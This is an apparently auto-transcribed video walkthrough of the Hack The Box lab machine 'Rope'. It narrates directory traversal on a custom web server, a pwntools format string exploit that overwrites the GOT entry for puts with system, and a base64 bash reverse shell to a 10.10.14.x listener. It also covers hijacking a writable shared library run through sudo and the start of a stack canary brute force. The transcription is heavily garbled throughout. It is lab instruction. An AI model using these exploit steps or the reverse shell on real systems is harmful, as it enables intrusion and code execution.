 what's going on YouTube the zipsak I'm doing rope from hack the box which is all about binary exploitation there's two main challenges in this box the very first one is the foothold on it which is a custom web server that's vulnerable to a printf exploit which you can use to both leak memory addresses and execute code and then the second challenge is kind of like a standard Rob challenge but the binary is compiled with stack Canaries so you have to brute-force a stack canary before you can do any wrapping around with this box we're gonna do something a little bit unique and kind of solve it twice the first time through this we're going to take advantage of pen tools and all it has to offer so instead of actually mainly crafting a printf exploit we can just call like FM t string underscore payload and it just does all that magic for us when it gets to doing the raw binary we can have pound tools do all the magical rebasing create the rap chain for us so always to do is write the syscalls it makes life easy but once we get all that working we're going to go back and do it manually without taking advantage of parent tools so you can understand what's going on under the hood so with all that being said let's jump in as always begin with and map so - SC for default scripts as V enumerate versions okay output all formats pin the end map track then call it rope and then the IP address which is ten ten ten 1:48 can take some time to run so I've already ran a looking at the results we have just two ports open the first one being SSH on port 22 and it's banner tells us it's in a bun - server and then we also have a second port and Maps not exactly sure what it is but it's listening on 90999 and based upon the end map script finger press fingerprint - strings and it looks very much like a web server because we just see that HTTP 200 okay and a bunch of HTML so I'm gonna go over and we're going to go to 10 10 10 148 port quad nines and looking at the page the title is login v10 and it looks to be just a login form I'm gonna press ctrl you to go over to the source code to see I can identify any technologies it's running WordPress Drupal PHP etc the CSS sheet this may be good scrolling down we do have main JavaScript as well looking at this doesn't look too interesting the next thing the input looks like it wants potentially email but outside of that I don't know I don't like reading JavaScript so we'll just probably come to back to that if we need it and we can try logging in so intercept is on let's turn it on here and then try admin and please subscribe click and go and the actual request doesn't have any data we just did a get no parameters it's not opposed to put the username and password and that's it so let's try bring an email real quick and then at localhost calm and we'll put please subscribe here click send and we still don't get anything so I'm gonna go back to the repeater tab looking at the header I don't really see anything too interesting here I'm gonna try looking at what a 404 page looks like so I'm just gonna get please subscribe because I doubt this actually exists on the server we get that 404 not found but now it's leaking the server we see simple HTTP server and at first glance you may think this is like Python but pythons user agent is not like this number one Python would always like camelcase it and number two it just doesn't look like it so if we just start up a web server so simple HTTP server and then we can curl - i is a head request so we're only gonna get the banner and one 27001 8,000 we can see what it's banner looks like and if this was python 3 we could also do that with python 3 - m HD b dot server go down and it's a pretty much identical the only thing that changes is the Python version so we don't know exactly what this web server is but the very first thing I always do when I come to and unknown web server is a try good old directory traversal and the URL because some reason that's common on web servers did I screw this up let's do one more maybe and keep going down maybe it has to be exact okay this 2's is in passwd and we get the actual output it always helps to double-check things because the number of times I've made a typo and just assumed it wasn't Womble is pretty high and then you waste a bunch of time you come back doing your queen I thought I'd check that but yeah so it's got directory traversal here we can try just getting like get Etsy passwd file not found but if we put a slash we actually get it so what this is doing is probably just like saying hey on this get request go up one character and open everything after it so probably looks something like this and because we put the slash here they can grab it cell doesn't really matter because we had passed traversal this just makes it a little bit easier if we get slash slash it actually just does a directory listing on the root directory which is super handy so the very first thing I want to do is probably grab the binary so we can go is proc self and probably CMD line and we don't get anything let's try and vine don't get anything CWD and now we have something so rendering the page we can see there is a binary here HTTP server there's also run sh so let's take a look at what that is and if you're confused about this let's say source I'm John but confused why this worked this is just an alias so inside the proc you have P IDs for every process that's running there is a hidden like self directory which is going to be your PID and then there is this CWD whoops I need L and we can just grab for it real quick that is just simply to your working directory so if I go make their HTP server go into this do that LS again we can see proc self is now pointed to the new working directory so we can probably just grab HTTP server and this is a binary so I'm just gonna curl this one we could probably right-click and copy to file but when I can curl I prefer just doing that so 10 10 10 148 port quad 9 - L HTTP server then chmod plus X and we can do a file against it this is an elf 32-bit and if we execute it you can show off that HTTP server Kol localhost quad 9 and it looks like it does a get on index dot HTML so test looks like yet and it's going for slash test so looks like we have everything the next step is to analyze this deidre so let's open up that application and we can just click on the little dragon and once this loads up we'll hit I to input a binary and go into root HD boxes rope HTTP server and open this up click OK and I will want to analyze this select everything click OK and starters right now it's a 32 bit elf looks like we've analyzed everything I don't see that bar running just look at exports and we'll go to Maine and let's just scroll until we see something that looks familiar so right here we do have the printf call and that's where we saw the listening on port when we just executed this I just do HTTP server we got that so we know what this is local 13 C based upon this printf this is obviously going to be the port and then local 134 is going to be the file descriptor and the file descriptor is probably going to be 3 by default so we could set like a comment forget the hot key to do that it's semicolon and aunt F D equals 3 and that kind of just helps analyze that a little bit while true local 12 C is equal to accept and then the file descriptor and then these two variables except is just a standard syscall so you can just do man except if you want to read about it does this tell us what it returns return will contain actual size and Pierre dress but where is it except oh right here sock FD sock address and sock length so we could say this one is sock addr and this is sucked le n could help a little bit when we just go analyze it process 12c this is the output of accept and not exactly sure what this is so the best way if you want to understand exactly what's going on and what a variable is it's just running in gdb so gdb HTTP server we can just run it control see this as for disassemble main and then look for the call so call accept so go here just break on this address continue curl localhost quad 9 you should definitely subscribe to my channel hit the breakpoint and we can see I don't know why it's three arguments except oh wait we wanted with this returned so if we just do next it should go over this call maybe I'm not sure exactly what's going on control-c let's quit out and restart this let me just make sure okay it wasn't running dissemble main we wanted to look actually at the process call so where is process what was it yeah so process is at this address copy break contango curl and it's giving us three arguments we got four I'm guessing this is going to be a file descriptor if we examine this what is this cannot access from memory don't know exactly what that is but I'm guessing this is going to be a child FD maybe I don't know we can put child FD is fourth question mark I'm kind of curious why process had three arguments when it's just two but it should be fine let's go into process to see exactly what this does and the reason why we can see all these function names is because this binary is not stripped so process is function within this actual program it's not like Lib C or something that's why if we do man process we don't get anything about that syscall because it's local to this program so we can take a look at what this does it is going to fork which means whenever we want to go into this we'll have to set the follow fork mode to child that's gonna get a PID do press request FD is pram 1 so this is definitely going to be correct it's going to be child FD and then PID well I guess child is a bad way to word that but oh well this can be PID local 88 for 200 don't know exactly what that means we can look at press request if we want to it's got quite a bit his index.html so I'm guessing this is probably gonna be like yeah it string length of this can be file most likely or will do HTTP underscore file because if that length is zero then it is now equal to index.html so this is length of HTTP file or we're just call this whoops HR for a handle return is generally what I call it see there is a STR copy so this could potentially be a buffer overflow so let's take a look at the sizes this is the destination this is what it's copying from so local 810 is 1,024 and we don't actually have the size of pram - this is most likely going to be like a struct or something in the C code and Giga didn't really press it correctly we can look at other things for what pram 2 is and I see 804 for a hundred 800 so 800 is the closest thing I see so I'm going to guess this is just going to be a length of 400 want to take a random guess we can print and zero X 400 1024 so guessing [Music] Bram two plus zero X 400 is was it 200 yeah 124 in length I just put the comments there if this was not 1,024 and was like 40 which would be 64 then we'd be copying a potential of a thousand 24 bytes into that which could lead to buffer overflow but because the lengths match there it's probably safe to ignore so let's go up one we can just keep going down to examine what's going on here directory request log access if we look at log access we can see pram 3 is being called directly to printf and in printf if the user ever has control over the very first parameter you can do a memory leak and then I think on most issues printf has % n which allows you to actually write I want to say some distres may have removed it by baby miss remembering that so % n would be writing how many bytes have been printed before but yeah so let's take a look at what pram 3 is so let's just go up dumain was this on main now this is am within process I believe yeah process log access so let's take a look at exactly what that is being called with so get out of this window and let's see let's just clean this up P kill - 9 HTTP server it's just a habit I have because sometimes when at Forks gdb follows the for now the process is listening on its own and you exit and it just becomes a pain - I'll show you real quick my always are on that kill let's just do run set follow fork mode shy old continue girl quit gdb free curl we're still running so if I did gdb run and we try to break I'm not actually broken because this application just I don't think checks if the ports listening first so it can just be a headache when stuff is being outputted to the pain and you assume it's within your gdb session but it's not so I do P SEF graph HTTP server I can see it running still so that's why I run be killed - 9 because now if I Carol it's not listening so now let's go trace that log access call so what I'm going to do run now let's first will break and was it process and set follow fork mode that child and then after process we want to break on log access we have to continue so now we are within process and if we dissemble this we also have a break call in this log access so 6de info be for breakpoints process oh I'm actually breaking inside of log access let's break here so we can delete to break there continue and we can see what each parameter is so arguments guest local so we probably want to disturb one right the third is params three right pram three and that printf yeah so one two three that's going to be phoneme so we can definitely control that so if we put like percent X here we'd have the memory leak let's put log access filename pram - this is probably gonna be some weird address I can't ask memory that's just pointing to it not exactly sure what that is we have to look at the card more one of those is probably the file descriptor or something but we got the important one parameter foul name pram - is probably going to be the file descriptor since it's an integer but let us look at printf now so we can continue and just quit we don't have to be in gdb to do this part so we'll just P kill it run HTTP server and if we curl and we'll do % X actually we have to do percent to 5 percent X we have to URL encode this if you look percent encode URL is percent to 5 so I just URL encoded that and we can see we got a address if we do another one we get a nother address so what we do is put something here I think that's for ace a taze yep and then do a bunch of X's so let's do Python print was it dot % to 5x times or do 128 so we can just copy all these and then paste this and we have a huge list of addresses and what we want to look for is a a the A's so we can just copy this go back to Python X is equal to that giant string and if we just do X is equal to X dot split on period so now we just have a list now we can do X dot index and one two three four one two three four maybe it's only four A's one two three four it's at 53 so X 53 and 54 cuz I put eight we probably only wanted to put four A's there so for some reason I was thinking this was sixty four-bit but one two three four so this is a memory address and now let's redo that X is equal to this and then the xsplit X index 53 so X 53 is the four A's and then 54 is the next address so now that we can over we know exactly where we are we can use the format string thing to write anything to whatever address we have here so it's kind of hard to explain I'm gonna use own tools to do this the first time and then if this video is not like three hours long left the last one we'll go back and do it all manually but essentially printf will allow us to write anything we want to an address that we put here so what we put is the actual address to symbol like puts and we change that to be system so the next time the application calls puts it's really calling system and we get code execution that way so printf can also be used to cause an RCE along with leak memory that's what I'm trying to get at so let's just go to HTTP server let's do this in visual studio because we loaded it last week and Visual Studio makes the everything nice so I'm just going to open folder rope HTTP server okay and then file new file let's just make sure we're in Python 3 save as i will call this exploit dot pi and then f5 to run it is running as python 3 so we should be good here the first thing we'll have to do is our imports the first being from pen import star this is parent tools then we probably want to do some type of HTTP things and i always like doing your lib parse import quote because I have issues with pen tools quote module context is going to be I 686 which is 32-bit and the OS is Linux our host this can be one 27001 for now and then our port oh man I can't type right now is plot nines I think that doesn't get put in quotes yeah I don't think it matters the very first thing was to do is probably make a quick wrapper around and getting a file so def get file and we can do R is equal to request get HTTP our host port and then the file then return a text and step one of our exploit is find a dresses because we have a SLR most likely we have to have a way to identify all the memory addresses and the way we're going to do this is the proc self map smile because we have lfi so finding binary lib see location via FRA self maps and if we go to burp suite let's go to repeater take a look at what this is product self maps and we don't get a file so let's go open gdb backup it's good a process this is where it Forks right yep so let's see parse request this is probably the one we want could also be serve static take a look at what press request is going down and right here I see it supports the HTTP parameter range so this is telling the server how many bytes to send back so if we do proc self maps and say range bytes is equal to 0-5 we get the first five bytes if we do 0-2 and 24 we get the first 1,024 bytes so let's try 4096 I just want to see if we get the whole file we get this so for some reason the I guess system just doesn't know how long this file is because it's dynamic so since it doesn't have an end never outputs if we don't have that Ray so again take the range off we don't get anything we could also now try CMD line and these things work so all these files we just couldn't get because of just how the file system was behaving but if we had tried the range parameter we'd be able to get it so this is I believe a standard HTTP thing let's just Google this HTTP range header yeah so definitely is a standard thing so always handy to have that but now that we know that we can go back to visual studio go to a request and we can do header is equal to range and then bytes 0 do 4096 and then headers is equal to header so every request now will have that range and that's going to be super handy because if we go back to this this tells us exactly where everything is loaded so we know the beginning address of HTTP server is right here and the beginning address to Lib C is right here so just knowing these two things will let us calculate all the offsets so let's do Maps is equal to get file proc self maps and then we can do I guess address bin or do ya address bin is equal to maps don't split and we'll split it by newline characters so each one of these will be a line entry and we want to grab the first eight characters so after that split zero for the first one and then eight for the very first characters and then address Lib C is equal to map split same exact thing and this one will be zero one two three four five six so six characters or six lines and the first eight so now we know where both of those are so we can do log success binary is ant 0 X address bin and this is going to be Lib C is at address Lib C so let's just try running this and we get two different dresses so that looks like it is going to be good so let's just fix this casing real quick so we got all the addresses so step two is going to be calculate offsets so log info finding the address of puts and system so health is equal to the HTTP server and I'm going to dude check sec is equal to false if we don't do that then every time we load this little elf command it's going to print out a bunch of debug stuff and then Lib C is going to be equal to elf dot slash Lib CSO dot sixth 32 and we'll have to download this so check SEC is equal to false so I think that's just in Lib 32 let's see get lib 32 see if we just get / want to turn range off nothing's worse than leaving that parameter they're getting Lib C and just having bad things happen we need to have the first slash so this is probably Lib 32 I guess we can go to a web browser slash slash and let's see Lib X 32 do we have a Lib C here Lib C D so 6 download CP downloads Lib C here and we called it dot 32 I think des we call it yep and actually let's let's do this locally first because it helps doing it locally because then I can show you all the addresses and we can check everything's working so let's move this to be 32 target locate Lib C we can buy just CP user for Lib 32 Lib C Esso dot six and lipsi so6 thirty-two self okay that should be fine and then we can just say elf dot address is equal to int address bin sixteen because this right now is just a string I believe so doing int same base 16 will convert this to X and do the same thing for Lib C address is equal to nth address Lib C 16 and these numbers are the ones we got from the maps and we can do log success oh we need to put in what not so foots is equal to this will be G ot puts and Lib not Lipsy elf dot G ot puts and the next thing we want is system is equal to Lib C dot symbols and we want system I believe and puts at g OT g OT puts this will be system Lib C is at system and we should change okay our host is local so let's just draw an HTTP server if we're not already we are running it run the program and hope it works we forgot to put F before this okay that looks good this can be set hex probably have to have unpacked 6000 we don't have to come on forget what I was saying we have this here so let's run this again but have gdb running so gdb HTTP server run send the request let's get all the addresses and now we can just examine each of these addresses to see if it is correct so ctrl C that is the address of puts and this is the address of system so what we're going to use printf to do is put this address right here and by doing that will let us some call system whenever the program does a put command you can also type G ot to look at the global offset table and we can see or it's at here this way as well so let's go back to visual studio and what step 3 now and pintles makes this super duper easy because it automatically has a printf chain so log info using printf and it was 53 if you remember when we did that X dot split thing to remap puts to system so now we can do a load is equal to FM t string payload this is from pound tools say 53 and then we put G ot puts : the address system and this should have been and squiggly brackets and I think that's it just looking at this yeah that looks fine so the next thing to do is do a get request so where is it we caught a get file and we can just get payload and I'm going to set a breakpoint here because I'm not positive exactly what this is going to be in code to this so run this did we kill it continue and I see that his and byte format which I don't like so let's just do dot decode I hate one of it has that be single quote and you're trying to do some type of exploit run UTF can't decode okay so the answer to that is by default it always tries to do utf-8 if you say Latin - 1 this seems to work not sure this is the correct way to fix that error message but it is the way I use now and we have now ran that exploit so the next step to do is I thought we should have saw something slightly different let's debug this we may have to do some type of quote I'm not sure if there's pluses are actually there but let's go and debug this so actually let's get away from doing this because we don't know exactly everything the requests module does and let's just do parent tools now real quick remote and we'll do was it our host our port then our dots and I don't know if I wanna do our dots and it send line what is that line F get and then we'll do quote payload HTTP 1.1 and new line and then r dot close let's see if this works real quick continue run it and it's not our dot it's our equals like that we opened and close the connection and we have this so it out putting something to stand it out if you're very observant you'll know that is the output if you type get in all caps but if not let's go debug exactly what happened so what I'm going to do is we'll break on process again and continue and let's go execute this disassemble where are we where's that fort call we okay so let's break after this fork oops so I'm gonna do set follow fork mode to child so now we can go into this we'll just break on fork continue next instruction to hop over this Fork I thought that's my bad I've always think when I'm like break fork it's gonna break on the call but it breaks soon as it enters fork come on get out of this okay we're in process I don't know we're in process we are but we're in process now let's just go back to G draw ID compile we want to be where puts our so log axes we want so let's break log access and hope we didn't pass it okay we did not [Music] it's weird on our way out / to that now but what I want to do is break on each of these puts and we'll look at it so break star here break here and break here continue so we're at our first puts and this one is just one 27001 this is gonna be what it calls so we can continue next one actually it was calling this up here it's the very first address on the stack that 32bit grabs so now it's calling puts on get and if we look at what puts is we do G ot puts and look at this address come on let's see this should be system that's some Lib C simple way to know let's just look at the script system f7 e one six five easy RL and let's just step something weird is happening so step in here push one puts we should have went to system so I think we went on the wrong request and this wouldn't get overwritten so let's restart this real quick and we'll try this one time fee kill - nah HTTP server it's always a demo gods that get me so what we wanted to do was set follow fork mode to be child break on log access now we don't even have to break on log access we can just just this break main run this disassemble log access and then we can go right after this printf and then look at what puts means so be right there and then we'll break on each call and we'll be a bit faster this time and set follow fork mode child continue Python 3 let's just make sure this is saved run it so right where we wanted it to wet the puts we put a break in for printf this is not behaving like I'd expect it to so let's see they run Pico last time it's definitely killed now and if I try to grab it doesn't work B main run break what was it up a few times to assemble log access I was to printf oh yeah there was two and it was definitely the second one so if we just break here oh not new tab and then there's the puts that I think I want to save time we won't break on each one set follow fork mode child continue oh I know what's happening so let's kill this I'm doing two requests and I'm breaking the very first request and that's falling on to do the second so let's see we'll break right before the fork so break main and we can run this and if I curl this nothing's listening yet because we broke our main this as process and go to fork break here and we will continue and we want the follow fork mode to actually be on parent right now so run this it's gonna do the first thing which is getting it from proc self maps continue now we're breaking on the second HTTP request so we're gonna do set follow fork mode to be child and now we can this as log access and go into this one so break here we want one more f1 yeah we can do both printf in this before-and-after I'm feeling cocky now that we can explain this so continue we're gonna hit this printf statement and if I do G ot and we look at printf or an upright F put let's see what this is that's G Lib C let's just continue so now we're right after the printf and that put is still oh yeah they put definitely changed I should've took a note so if we go up this is the last one puts is at five six whatever now we can just add Kel and then just recently puts is at seven E 165 easy row which is system so we could also now continue Oh where are we did we die del 1 del 2 del 3 del 4 I don't know exactly where we are here's a call 3 that's the pant handler or the parent file descriptor do we take too long again I bet we're in like system or something but now let's just try one last time to explain so now that we have this pretty much down P kill run break main and then this as process to break on the fourth call to grab the second one and now this as log access we want to break on this put okay continue follow fourth wave to be parent don't three del to I don't know what just happened there break main run that should be the fork and this should be the puts call nope there's or not you know every time you think you understand and can explain it something else happens so fork we do not want you I should have just hard coded it because it's not changing so get past the first one we're at the second one so set follow fork mood to be child and then we want to break on puts now so this as log excess and will break on this puts see I followed fourth child right and that's something weirds happening but if you go back in the video you saw me go through the printf or the puts one of them was on I get so what that's telling us to do is change a request and we put a command here so if the command was Who am I and we run this exploit so let's just do P killed s9 HTTP server and now we run this again we can see it actually running the command who am i if we do ID I bet you can guess it runs the command ID so now all we have to do is a reverse shell so we'll do echo - n was it bash - I have TCP ten ten fourteen to nine thousand one zero at and one base64 and we can't have spaces here so we're just going to do high FS whatever we need a space so let's do CMD is equal to pastor Rev shell and this will be echo ifs base64 ifs pipe ifs base64 and that stands for internal field separator and by default it's just equal to space so that's the command so we can probably just do CMD here and the reason why I put this all in a separate line is because how I'm doing the bracket expansion this would resolve to a variable so and n CEO and CL vnp 9001 make sure this is saved and then run it and we get a show so now we can go test on the target system we have Lib C dot 632 target so that's all we have to change L so where is the Lib C this will be target let's make this a bit more obvious Lib C file or just do Lib C in all caps I don't think that's taken as a variable name all right here starport Lib C and we can do 10 10 10 148 n CL vnp 9001 we can kill this HTTP server we can run the exploit up here Python 3 exploit pie and if we did everything correctly which we did not we would have had a shell so let's see our hosts 10 10 10 148 Lib C 32 target and since we did an error out here we know that worked just try running it again let's try running it locally dot self dot /e to be server and that works so let's see 5 6 5 6 3000 so these dresses are different so I think that's correct see exit one of it's the wrong Lib C version Lib C dot so 6:32 target elf 32-bit that should be fine see if config tun zero I am 10 10 14 - that's still going localhost change this to target look at Lib C to make sure nothing's hard-coded the request on proc Maps is definitely our host that all looks surprisingly good CMD quote payload run this again and nothing hmm my only guess is we have the wrong Lib C so let's go back to rep sweet and let's go - was it proc self maps I can type and we have to do the range was it fights equal zero to 4096 there we go and let's just grab this Lib see this may be a different one we just grabbed like Lib X 32 Lib 0.6 or something I wonder if we grabbed it off a local host I don't know what we did but let's do curl - ah to curl 10-10-10 1:48 / /lib 32-year will have to do port 999 - OH Lib C X 32 dot target 9.99 and md5sum Lib C so we have three Lipsey's all three are different so I'm feeling confident now let's grab this file name go back up to the very top change Lib C to be that and rerun our exploit and there we go so having the right Lib C is definitely helpful let's see see D slash home and we are John so let's go into John and we don't have anything but we can drop an SSH key to get a better shell so make der SSH and let's do CD dot dot SSH - key gen - f we'll just call this rope cat rope Pub we can grab this copy and then echo we probably should have done a single quote oh well authorized authorized keys chmod 600 chmod 600 Shi SSH - I broke John at 10 10 10 148 and does it go let me in it's taking its sweet time there we go so that definitely does work so let's exit that pain exit this pain and do an LS nothing but at least now we can just get back into this box pretty quickly but before we go forward I just think I realized why I was having trouble debugging the HTTP server so let's go back real quick and do that I think it's because the system syscall actually Forks so it was forking that system one 27001 call and then never returning so that's what I think happened let's take a look real quick visual studios up here this wants to be localhost and a Lib C target that was Lib C dot s o dot six dot Kali I think or a self let's take a look unless HTTP server target target self ok Lib C 632 self so let's start this so SSL NP grep quad nine it's not listening so gdb HTTP server break on main run it and now we want to this as if a disassembly on process go to the fort call and we're going to break on this and continue now we can run our exploit script so Python three exploit PI this the first one of us grabbing proc maps we don't want it so we step over it then this is the second one so we want to break here so we'll do what set follow fork mode child and we want to do disassembly on vlog access and let's do it on printf it's this call that is doing the printf we want so let's just break here and then we continue to this printf and now let us set follow fork mode to be a parent and if we do G ot we can look at the puts call and we see it is this so echo that will do next to step over this call we can do G ot again look at the put call we can see this now resolving to system that's the key so you can see it's definitely changed and this F 71 is what we say system is if you wanted to you could debug it and see that is indeed system so now the next thing is all these puts calls so this is now doing system not puts so let's just break on each of these and I believe system does do a fork so we don't want to go into it and I want to say I already set forth mood to be parent or we'll do it again for good measure so now we're going to continue and it's going to break on the first put and we're doing a put on whatever this is let's look at that actually it is here and we want to go process and where is log access the very first part of puts is a blank line so that kind of fooled me so this is just probably nothing whatever but the first quarter part is a blank line and hopefully we continue and hit a next call we do so before that's when we went into probably Lib C system and never returned but because we're not following the child we no longer go down into that Lib C path and we get back to this put so we're doing a puts and the very first argument is like the request method if we look at that that is what this one is so we do a continue hit the next foot and this is our payload and if we didn't have the command as this it would have just been get but I forgot to change this piece back to get to make it look like an HTTP request but now you should see exactly what is happening on this and mothers having so much trouble I really just hate debugging anything that Forks because it's just a nightmare to keep track of the follow fourth mode thing but that is that hopefully that makes sense and that helped you let's now get back and do the next thing if we do we're back on SSH on rope as John if I just do sudo - L we see John may run the following command one roof usually bin read logs as r4j so I'm gonna do sudo - u / 4 J on this bin and it's always C so almost like it's just tailing the log and I say tail because this looks like ten lines by just eyeballing it this sh pumped is really slow we can s trace on this binary and kind of see what it does let's see em protect so here's that call we're doing user bin tale and it can't open this because a permission denied but I was checking to see if this was a full path if it was just like tale well we could change our path probably to be current working directory and as I say that it's not going to work because this is sudo and Souter is probably going to make that a yeah secure path so we can't edit the path and execute it because cedar is always gonna set our path but whenever you see a system called that's not an absolute path generally something to play around with but we can't see anything there so the next thing to do is copy this binary and examine it so let's do make to read logs and we can just SCP I dot dot slash rope John at ten ten ten 1:48 user ban read logs and we'll copy it to our current working directory and come on I don't know why this is going so slow good top that HTTP server is eating up a lot of resources so we probably left it in a weird state but oh well so you just do deidre now I'm gonna hit I to import a new file up one directory read logs take a look at this and we will analyze everything yet again and let's see exports main and all its doing is print log and we try to go here we don't have this function we go back to John and go where this s trace is how come I just do it on local machine now if we do ldd on read logs we can see it looks like it's logging looking for Lib log SL so I'm gonna do is locate lib load SL and doesn't find it let's just do find - named lib log dead SL pipe it to Devin all I wonder if I do like Star whatever kind of want to revert this machine because it's going so slow but we found this and what we can do is SCP this file to us and if we just do LS LA on the file let's copy this again we can see it's CH modded to 777 so we can overwrite this binary and we can probably just create our own binary that calls this print log and then execute system so let's try this real quick let's do VI Lib log dot I guess C and then we'll do include standard Lib H and we'll do void print log system and - that looks good and just want to compile this so GCC Lea blog dot C and this is - shared so it's a library and we'll call this Lib log dot inject SL I guess I don't know go back to SCP and we'll do live blog inject sl2 I'm trying to debate if I want to copy it to his home directory or not let's just get a sudo command ready so sudo sudo - l / 4j there we go so your sudo command is ready let's copy this file and as soon as the copies will execute it because there's probably a cron job restoring this so it's copied we run it and we are now the r4j user so just like that are able to switch users we go into home / for day and we can read user dot text and we can also make duress SH and do this so we can easily get back to this user let's do cat rope pub grab our key and we'll do echo this to authorized keys chmod 609 shy SSH - I broke pub r4j at Ted and 1010 148 and chmod 600 it's not roped up up we just want route that's the private key cat rope chmod 600 my left add dot slash when I went up a directory so it's no longer that let's see come on let me in so we can get rid of this SSH connection and now we are the our 4-day user as SSH normally I would run like Lin peas here or linen oom but it is a CCDC weekend and I'm very short on time so I'm just gonna jump to it and show all the processes running by root and we see that root is running a binary opt support contact and this is definitely not a standard thing also if we did SS - Ln PT to show open points we have a port listening on localhost leet so we got two things that we don't exactly know if we go into CD op support into an LS - la it is just a binary running as root and the ADM user could execute it if they wanted to so let's go make the support and let's do SCP - I specify our SSH private key for J at 1010 and 148 and opt support contact and copy it to our current directory and I'm looking at this wonderfully even be able to read it here yep we can so LS - la we have the contact binary and if we go back into G draw we can just press I go up one directory go into where is it support contact click OK analyze it like always select all and we can kind of step through this so right away we don't see main under the exports we have this entry which is just the Lib C entry this one is a de binary's so we don't have any of the function names but this very first function right here this is going to be the entry point we can double-click it we can go in here and then press L to rename and we'll call this main and kind of go looking at what this is we could just kind of execute it to get a head start and an idea I'm just going to go into a new pane let's go into support dot slash contact and then we could like netcat localhost one two three four all right now this one is elite and we see request accepted and please enter a message to send to admin hello please subscribe - if sec it just says done so we could send a bunch of a's so if we just copy this and send a word chunk we see stack smashing detected unknown terminated so looks like it does have some type of canary protection we could verify that by just going gdb dot slash contact run it and do check SEC and we can see canary yes and it's got a static value now this is a stack canary it may make more sense in just a little bit but this is going to stay the same as long as the program runs if we do an exit or quit and rerun this and do checks at the stack canary changes but as long as we don't terminate this process it's going to stay the same so let's go see exactly what this is doing based upon this printf we already know what probably two variables are going to be the very first one is going to be port and this one is going to be follow descriptor pretty easy let's see local third except this is handling kind of like the HTTP server I believe so this is going to be what was it sock address I believe and this was sock length and local 38 this is going to be foul descriptor I believe let's look at man accept and take a look yeah sock ft so we can just do like that I forget exactly what we said this variable was but nothing else is going on here if we go down here we got function whatever local 30 so this is the return of the accept call if we go into this we can kind of get an idea what it's doing right away it Forks so I'm just gonna call this handle request because it's kind of what it's doing its handling or netcat requests that we go into it so call us fork and there's doing this get UID request accepted doing a string length function per my please enter the message you want and then calling this on pram one so right this is probably gonna be the file descriptor so this is most likely our di which is going to be for I believe let's do man right whoops and right now we get a command right not the actual syscall if you didn't man man you can see page two is going to be system calls so if we did man right dot two this will be where we want so this is another file descriptor F D I said already I because it's the very first argument but we'll just call this F D and then we're calling function on the file descriptor so let's see exactly what this is doing and let's see local 10 gram 1 we know that was f D so we're writing F D into local 48 and this is going to be 400 so let's look at what that is Python 3 X 0 X 400 4 and 1024 so let's see and what is the last one man receive so softie buff lengths flags so we're writing from F D so this is going to be user input so most likely this is the message we sent and we can verify that in a second but let's just call this user message not F D so like that and we're writing up to 1024 bytes into local 48 and local 48 is defined at 56 bytes so anything after 56 will probably crash it and we can verify that by just going back to continue netcat localhost leet and we want to do Python - see print a times 56 and we'll send 56 A's and stack smashing detected let's go do the same thing and send 55 days and we don't get anything so that is definitely a good sign I'm guessing that said like 56 days and then it did a line break so even though it was 56 it was a hidden character because again you got to terminate the socket so it probably sent a line break the us hitting an Enter key so let's go and debug this so ctrl C and we want to do disassembly and um let's see Cisco I was looking for the fork and we definitely don't have a disassembly main because we don't know where main is we could probably do info functions and get a list of every function which probably isn't gonna be too helpful let's just call break on fork sweet and then we can sort set folow fork mode to be child and then continue and we'll send this message and let's do next 50 times and looks like we're good let's see where we are disassemble let's see does any of this look acceptable or in Lib C receive so right now we are in this call I believe so we kind of overshot it just a little bit yeah so let's continue send the message and I'm gonna restart this so info inferior can we still go back up I'm just going to psdf grep on what is it contact and we will attach to this and no such program connection refused so we can just run this set follow fourth mode shy old and we want to break on maybe receive let's see this is where having like if it was later or something we could hook deidre into gdb then we could just right-click and set breakpoints and just be happy but it doesn't have that support so let's see what do I want to do I guess we could break on right as well so continue so let's get out of this for call and we probably can maybe get two right I think we're at right yes we are our file V print F don't know where I'm at now still haven't got the output yet though so now we have the please send your message we sent we have this call I don't know exactly what this is calling but we can look at the registers this is probably to this function f FF 9 a is probably calling this so let's go into it we move okay so we're at the receive right now so let's put the I guess 56 A's and step here so now we are at receive and if we step over receive we should hit this if then so we were here if we hit next we should hit dot so let's do that and we don't but we're moving this into EAX and I'm guessing the knop was up here but what just happened is this is going to be the stack canary and what we just moved was the buffer and I forget if we did 55 or 56 days but let's go next and we're testing EAX and EAX weight I don't think we're exactly what I think I am Not Taken see this is receive still return knob okay this is where I thought we were so this is now loading in the stack so if we sent more than 56 bytes that's going to populate our DX now so I'm going to do si and if we look at what our DX is it is this and this is the stack canary I believe if we do check SEC it is so extraordinary X against probably itself and let's see what it's now set at zero so we did not modify the stack canary and if we continue it just says done so let's see if we can do that twice in a row or maybe if I just can get it to attach we can use the same [Music] spot so we want to break potentially in a perfect world if we can get back to it right there's way we want to break yeah so let's control Sierra this go in here we did not there we go we hit break points so I think we're back in a parent right there yeah so this one is on the fork so we can continue and let's put break stir this and I hope this works continue we're now at right so we're gonna continue again and of the message we want to send to the admin let's do a little more ease so instead of 56 let's do 64 let me double thinking real quick yeah let's do 58 this would be better and we'll send 58 A's and hope that that memory address stayed the same it probably did since we didn't restart the parent continue a segfault what is it still listening okay so let's attach and hope it works let's see which one do we want maybe 1 1 3 3 5 a 1 1 3 5 5 that's the older one continual let's send the same number of a's stack smashing detected so we didn't have any a breakpoint set set follow fourth mode child let's see I think all the memory address has changed because a breakpoint was still there one two but it's also possible follow fourth my child was not on let's attach again continue we just keep crashing immediately I guess we can restart this and hope for the best pto - 9 contact gdb run from this send the A's set follow fourth mode childe break fork continue now we're at the fort call let's just do next 50 where are we now wants to send the message I may have jumped the gun on that maybe won't send it again hopefully it doesn't send it twice so next 50 again aborted hopefully we get this this time if not I'll just try explaining it and then we'll move on it's much easier knowing how it works then actually getting the debug since I'm not the best when it comes to gdb well let's see what I want to do set follow fork mode child break on pork actually we'll just break on write or receive as we're breaking continual send let's send this and then we'll do next ten and wet race don't know where this is stopped this is bothering me now run set follow fourth mode shy old break receive continue send all the A's next oh all I do is one next and it jumps over that hook all so that's what was happening that makes this a lot easier so if I step over this one up now if we look at our DX it is just what is it 400 so it's the length of whatever call it was right here but we're going to change that with this move D word OBP minus eight and now if we look at our DX we should have two A's for one for one so if we go back down here check go this and we did check SEC her canary has been partially overwritten by two A's so the exploit that we're going to do is brute force this canary which means we're going to send it fifty six bytes and then brute force all the hacks from 0 to F F and then when it hits zero zero we would have overwritten the first byte of the canary to be what we wanted and then we go to the next byte and this one wiII be brute-forcing until it hits ninety three and when it hits ninety three and says the done message we know we got this part of the canary correct and then zero a it keeps just going down the list zero a this was where I was saying before that is the enter key so yeah so hopefully that kind of makes sense of what we're doing 